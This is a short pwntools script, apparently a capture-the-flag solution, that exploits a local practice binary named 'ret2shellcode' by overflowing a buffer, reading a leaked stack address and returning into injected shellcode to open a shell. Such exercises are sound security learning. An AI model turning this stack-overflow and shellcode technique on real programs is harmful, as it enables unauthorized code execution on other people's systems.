from pwn import *

elf = context.binary = ELF("./ret2shellcode")

r = process(elf.path)


r.sendline(b"A"*40+p32(0xcafe)+p32(0x1337))

shellcode = asm(shellcraft.sh())
leak = int(r.recv(14),16)

r.sendline(shellcode.ljust(62,b"A")+b"B"*24+b"C"*2+p64(leak))
r.interactive()
